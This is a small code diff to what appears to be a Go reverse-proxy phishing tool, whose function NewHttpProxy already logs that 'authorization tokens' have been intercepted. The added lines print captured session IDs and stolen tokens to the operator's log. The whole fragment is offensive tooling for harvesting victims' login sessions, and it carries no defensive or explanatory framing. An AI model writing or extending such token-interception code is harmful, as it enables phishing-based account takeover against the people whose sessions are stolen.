@@ -693,6 +693,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									s.IsDone = true
+									log.Success("%s %s", ps.SessionId, s.Tokens)
 								}
 							}
 						}
@@ -708,6 +709,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if is_auth {
 				// we have all auth tokens
 				log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+				log.Success("Intercepted Session: %s", ps.SessionId)
 			}
 
 			// modify received body
@@ -830,6 +832,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								log.Success("Tokens intercepted: %s", ps.SessionId)
 							}
 							break
 						}
